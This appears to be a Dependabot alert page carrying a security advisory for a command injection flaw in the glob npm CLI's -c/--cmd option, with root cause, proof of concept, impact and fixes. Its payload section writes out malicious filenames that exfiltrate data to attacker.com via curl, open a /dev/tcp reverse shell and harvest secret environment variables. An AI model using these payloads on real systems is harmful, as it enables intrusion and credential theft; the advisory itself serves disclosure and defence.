@@ -1,0 +1,129 @@
+glob CLI: Command injection via -c/--cmd executes matches with shell:true #7
+ Open Opened 17 minutes ago on glob (npm) · package-lock.json
+Loading
+Creating a security update for glob
+Dependabot is creating a security update to fix 1 Dependabot alert on glob in package-lock.json.
+
+Or, manually upgrade glob to version 11.1.0 or later. For example:
+
+"dependencies": {
+  "glob": ">=11.1.0"
+}
+"devDependencies": {
+  "glob": ">=11.1.0"
+}
+Transitive dependency glob 10.4.5 is introduced via
+tailwindcss 3.4.17  ...  glob 10.4.5
+Package
+Affected versions
+Patched version
+glob
+(npm)
+>= 10.3.7, <= 11.0.3
+11.1.0
+Summary
+The glob CLI contains a command injection vulnerability in its -c/--cmd option that allows arbitrary command execution when processing files with malicious names. When glob -c <command> <patterns> is used, matched filenames are passed to a shell with shell: true, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.
+
+Details
+Root Cause:
+The vulnerability exists in src/bin.mts:277 where the CLI collects glob matches and executes the supplied command using foregroundChild() with shell: true:
+
+stream.on('end', () => foregroundChild(cmd, matches, { shell: true }))
+Technical Flow:
+
+User runs glob -c <command> <pattern>
+CLI finds files matching the pattern
+Matched filenames are collected into an array
+Command is executed with matched filenames as arguments using shell: true
+Shell interprets metacharacters in filenames as command syntax
+Malicious filenames execute arbitrary commands
+Affected Component:
+
+CLI Only: The vulnerability affects only the command-line interface
+Library Safe: The core glob library API (glob(), globSync(), streams/iterators) is not affected
+Shell Dependency: Exploitation requires shell metacharacter support (primarily POSIX systems)
+Attack Surface:
+
+Files with names containing shell metacharacters: $(), backticks, ;, &, |, etc.
+Any directory where attackers can control filenames (PR branches, archives, user uploads)
+CI/CD pipelines using glob -c on untrusted content
+PoC
+Setup Malicious File:
+
+mkdir test_directory && cd test_directory
+
+# Create file with command injection payload in filename
+touch '$(touch injected_poc)'
+Trigger Vulnerability:
+
+# Run glob CLI with -c option
+node /path/to/glob/dist/esm/bin.mjs -c echo "**/*"
+Result:
+
+The echo command executes normally
+Additionally: The $(touch injected_poc) in the filename is evaluated by the shell
+A new file injected_poc is created, proving command execution
+Any command can be injected this way with full user privileges
+Advanced Payload Examples:
+
+Data Exfiltration:
+
+# Filename: $(curl -X POST https://attacker.com/exfil -d "$(whoami):$(pwd)" > /dev/null 2>&1)
+touch '$(curl -X POST https://attacker.com/exfil -d "$(whoami):$(pwd)" > /dev/null 2>&1)'
+Reverse Shell:
+
+# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)
+touch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'
+Environment Variable Harvesting:
+
+# Filename: $(env | grep -E "(TOKEN|KEY|SECRET)" > /tmp/secrets.txt)
+touch '$(env | grep -E "(TOKEN|KEY|SECRET)" > /tmp/secrets.txt)'
+Impact
+Arbitrary Command Execution:
+
+Commands execute with full privileges of the user running glob CLI
+No privilege escalation required - runs as current user
+Access to environment variables, file system, and network
+Real-World Attack Scenarios:
+
+1. CI/CD Pipeline Compromise:
+
+Malicious PR adds files with crafted names to repository
+CI pipeline uses glob -c to process files (linting, testing, deployment)
+Commands execute in CI environment with build secrets and deployment credentials
+Potential for supply chain compromise through artifact tampering
+2. Developer Workstation Attack:
+
+Developer clones repository or extracts archive containing malicious filenames
+Local build scripts use glob -c for file processing
+Developer machine compromise with access to SSH keys, tokens, local services
+3. Automated Processing Systems:
+
+Services using glob CLI to process uploaded files or external content
+File uploads with malicious names trigger command execution
+Server-side compromise with potential for lateral movement
+4. Supply Chain Poisoning:
+
+Malicious packages or themes include files with crafted names
+Build processes using glob CLI automatically process these files
+Wide distribution of compromise through package ecosystems
+Platform-Specific Risks:
+
+POSIX/Linux/macOS: High risk due to flexible filename characters and shell parsing
+Windows: Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL
+Mixed Environments: CI systems often use Linux containers regardless of developer platform
+Affected Products
+Ecosystem: npm
+Package name: glob
+Component: CLI only (src/bin.mts)
+Affected versions: v10.3.7 through v11.0.3 (and likely later versions until patched)
+Introduced: v10.3.7 (first release with CLI containing -c/--cmd option)
+Patched versions: 11.1.0
+Scope Limitation:
+
+Library API Not Affected: Core glob functions (glob(), globSync(), async iterators) are safe
+CLI-Specific: Only the command-line interface with -c/--cmd option is vulnerable
+Remediation
+Upgrade to glob@11.1.0 or higher, as soon as possible.
+If any glob CLI actions fail, then convert commands containing positional arguments, to use the --cmd-arg/-g option instead.
+As a last resort, use --shell to maintain shell:true behavior until glob v12, but ensure that no untrusted contents can possibly be encountered in the file path results.
